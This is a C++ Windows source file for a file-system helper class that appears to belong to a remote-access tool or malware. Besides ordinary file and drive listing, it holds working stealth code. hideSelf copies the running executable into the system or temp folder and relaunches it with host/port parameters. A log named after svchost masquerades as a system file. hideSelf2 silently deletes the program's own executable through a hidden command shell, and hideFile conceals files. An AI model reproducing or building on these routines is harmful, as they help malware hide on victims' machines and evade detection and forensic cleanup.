#include "FileSystemManager.h"
#include <cstdio>
#include <ShlObj.h>
#include <strsafe.h>

FileSystemManager::FileSystemManager()
{
}


FileSystemManager::~FileSystemManager()
{
}


std::vector<std::wstring> FileSystemManager::GetLocicalDrivesW() const
{
	const auto size = ::GetLogicalDriveStringsW(0, nullptr);
	auto buffer = std::make_unique<wchar_t[]>(size);

	::GetLogicalDriveStringsW(size, buffer.get());
	std::vector<std::wstring> drives = std::vector<std::wstring>();
	std::wstring current;
	for (auto i = 0; i < size; ++i)
	{
		if (buffer[i])
		{
			current += buffer[i];
		}
		else
		{
			if (!current.empty())
			{
				drives.push_back(current);
				current.clear();
			}
		}
	}

	return drives;
}

void FileSystemManager::hideFile(char* fileAbsolutePath)
{
	SetFileAttributesA(fileAbsolutePath, FILE_ATTRIBUTE_HIDDEN);
}


void FileSystemManager::hideSelf()
{
	HMODULE h_mod;
	char* c_path[MAX_PATH];
	char futureExeAbsolutePath[MAX_PATH + FILENAME_MAX + 1];
	std::string currentProcessAbsolutePath;
	std::string currentProcessFolderPath;
	std::string currentProcessFileName;
	bool b_admin_access;
	TCHAR tmpAbsolutePath[MAX_PATH];
	TCHAR sysAbsolutePath[MAX_PATH];
	PCSTR str_host;
	PCSTR str_port;
	char c_temp_cmd[MAX_PATH + 20];
	char cmdAbsolutePath[MAX_PATH + 7];
#define						TMPLOG							"svchost.log"

	// Get handle of current Module
	h_mod = GetModuleHandleW(NULL);
	// Get absolute path of current process
	GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);

	currentProcessAbsolutePath = (char *)c_path;
	currentProcessFileName = currentProcessAbsolutePath.substr(currentProcessAbsolutePath.find_last_of('\\') + 1);
	currentProcessFolderPath = currentProcessAbsolutePath.substr(0, currentProcessAbsolutePath.find_last_of('\\'));
	// Just the path of the executed location.

	GetTempPath(MAX_PATH, tmpAbsolutePath);
	GetSystemDirectory(sysAbsolutePath, MAX_PATH);

	// If folder where our exe is located is neither system nor tmp
	if (strcmp(currentProcessAbsolutePath.c_str(), sysAbsolutePath) != 0 && (strcmp(
		std::string(std::string(currentProcessAbsolutePath) + "\\").c_str(),
		tmpAbsolutePath) != 0))
	{
		sprintf(futureExeAbsolutePath, "%s\\%s", sysAbsolutePath, currentProcessFileName.c_str());

		std::fstream fileInputStream(currentProcessAbsolutePath, std::ios::in | std::ios::binary);
		std::fstream fileOutputStream(futureExeAbsolutePath, std::ios::out | std::ios::binary);

		// Permission check
		if (fileOutputStream.good() || fileOutputStream.is_open())
		{
			// We can write into system folder
			fileOutputStream << fileInputStream.rdbuf();

			fileInputStream.close();
			fileOutputStream.close();
		}
		else
		{
			// Close File Output Stream to System Folder location
			fileOutputStream.close();

			// Write exe into world writeable folder (%TMP%)
			sprintf(futureExeAbsolutePath, "%s%s", tmpAbsolutePath, currentProcessFileName.c_str());
			fileOutputStream = std::fstream(futureExeAbsolutePath, std::ios::out | std::ios::binary);

			fileOutputStream << fileInputStream.rdbuf();

			fileInputStream.close();
			fileOutputStream.close();
		}

		char paramFormat[23];

		// sprintf(paramFormat, "%s %s", str_host, str_port);

		ShellExecute(NULL, "open", futureExeAbsolutePath, paramFormat, 0, 0);
		exit(EXIT_SUCCESS);
	}

	sprintf(c_temp_cmd, "%s%s", tmpAbsolutePath, TMPLOG);
	sprintf(cmdAbsolutePath, "%s\\cmd.exe", sysAbsolutePath);

	remove(c_temp_cmd); // Remove previous instance.
}

BOOL FileSystemManager::hideSelf2()
{
	SHELLEXECUTEINFO sei;

	TCHAR szModule[MAX_PATH], szComspec[MAX_PATH], szParams[MAX_PATH];

	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) && (GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		lstrcpy(szParams, "/c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");

		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = "Open";
		sei.lpFile = szComspec;
		sei.lpParameters = szParams;
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		if (ShellExecuteEx(&sei))
		{
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
			SetProcessPriorityBoost(sei.hProcess, TRUE);

			SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
			return TRUE;
		}
		else
		{
			SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}

bool FileSystemManager::fileExists(const char* fileAbsolutePath)
{
	std::ifstream inputStream(fileAbsolutePath);
	return inputStream.good();
}

std::ifstream::pos_type FileSystemManager::getFileSize(const char* filename)
{
	std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
	return in.tellg();
}

std::ifstream::pos_type FileSystemManager::getFileSize(const std::wstring& filename)
{
	std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
	return in.tellg();
}

void FileSystemManager::readBinaryFile(const wchar_t* fileName, void* buffer, DWORD bufferLen)
{
	DWORD bytesRead; // receives size of the buffer in bytes	
	const HANDLE hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, NULL,
	                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		const ULONG fileSize = GetFileSize(hFile, NULL);

		// const PVOID Blob = static_cast<PVOID>(malloc(fileSize + sizeof(CHAR)));

		if (ReadFile(hFile, buffer, bufferLen, &bytesRead, NULL))
		{
			if (fileSize < bytesRead)
				bytesRead = fileSize;
		}
	}
	CloseHandle(hFile);
}

char* FileSystemManager::getDesktopPath()
{
	char* path;
	path = new char[MAX_PATH + 1];
	if (SHGetSpecialFolderPathA(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE))
		return path;
	else
		return nullptr;
}

char* FileSystemManager::getWindirNot()
{
	TCHAR pf[MAX_PATH];
	SHGetSpecialFolderPathA(0, pf, CSIDL_COMMON_MUSIC, FALSE);

	std::string test(&pf[0]);
	std::string test2(test.begin(), test.end());
	char* path = _strdup(test2.c_str());
	return path;
}

bool FileSystemManager::isDirectoryExisting(const std::wstring& file)
{
	DWORD result = GetFileAttributesW(file.c_str());
	if (result == (DWORD)-1)
		return false;
	return true;
}

bool FileSystemManager::fileExists(const std::wstring& file)
{
	std::wifstream ifile(file.c_str());

	if (ifile.is_open())
	{
		ifile.close();
		return true;
	}
	return false;
}

bool FileSystemManager::deleteDir(const wchar_t* path)
{
	bool result = true;
	WIN32_FIND_DATAW findFileData;
	HANDLE hFind;
	DWORD attributes;
	wchar_t str[MAX_PATH];
	wcscpy(str, path);
	wcscat(str, L"\\*.*");
	hFind = FindFirstFileW(str, &findFileData);
	do
	{
		if (wcscmp(findFileData.cFileName, L".") != 0
			&& wcscmp(findFileData.cFileName, L"..") != 0)
		{
			wcscpy(str, path);
			wcscat(str, L"\\");
			wcscat(str, findFileData.cFileName);
			attributes = GetFileAttributesW(str);
			if (attributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				// Is directory
				if (!deleteDir(str))
				{
					result = false;
					break;
				}
			}
			else
			{
				// Is file
				if (!DeleteFileW(str))
				{
					result = false;
					break;
				}
			}
		}
	}
	while (FindNextFileW(hFind, &findFileData));
	FindClose(hFind);
	RemoveDirectoryW(path);
	return result;
}

void FileSystemManager::listRoots(std::vector<FileInfo>& roots)
{
	std::vector<std::wstring> drives = GetLocicalDrivesW();
	for (const auto& drive : drives)
	{
		FileInfo fileInfo = {};
		fileInfo.path = drive;
		UINT attrs = GetDriveTypeW(drive.c_str());
		fileInfo.dwFileAttributes = attrs;
		roots.push_back(fileInfo);
	}
}

void DisplayErrorBox(LPWSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and clean up

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
	                                  (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(
		                                  TCHAR));
	StringCchPrintfA((LPTSTR)lpDisplayBuf,
	                 LocalSize(lpDisplayBuf) / sizeof(TCHAR),
	                 TEXT("%s failed with error %d: %s"),
	                 lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}

void FileSystemManager::listFilesW(const std::wstring& path, std::vector<FileInfo>& files) const
{
	WIN32_FIND_DATAW ffd;
	LARGE_INTEGER filesize;

	WCHAR szDir[MAX_PATH];
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;
	const wchar_t* origin = path.c_str();
	StringCchLengthW(origin, MAX_PATH, &length_of_arg);

	if (length_of_arg > (MAX_PATH - 3))
	{
		// Directory path too long
		return;
	}

	// Prepare string for use with FindFile functions.  First, copy the
	// string to a buffer, then append '\*' to the directory name.

	StringCchCopyW(szDir, MAX_PATH, origin);
	StringCchCatW(szDir, MAX_PATH, TEXT(L"\\*"));

	// Find the first file in the directory.

	hFind = FindFirstFileW(szDir, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		wchar_t errorMessage[] = L"FindFirstFile";
		DisplayErrorBox(errorMessage);
		// return dwError;
		return;
	}

	// List all the files in the directory with some info about them.
	do
	{
		if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0)
		{
			continue;
		}

		FileInfo file = {};
		file.dwFileAttributes = ffd.dwFileAttributes;

		file.path.append(origin).append(L"\\").append(ffd.cFileName);
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
		}
		else
		{
			filesize.LowPart = ffd.nFileSizeLow;
			filesize.HighPart = ffd.nFileSizeHigh;
			file.fileSize = filesize.QuadPart;
			file.fileSize = (static_cast<long long>(ffd.nFileSizeHigh) << 32) | ffd.nFileSizeLow;
		}

		files.push_back(file);
	}
	while (FindNextFileW(hFind, &ffd) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		wchar_t errorMessage[] = L"FindFirstFile";
		// DisplayErrorBox(errorMessage);
	}
	FindClose(hFind);
}
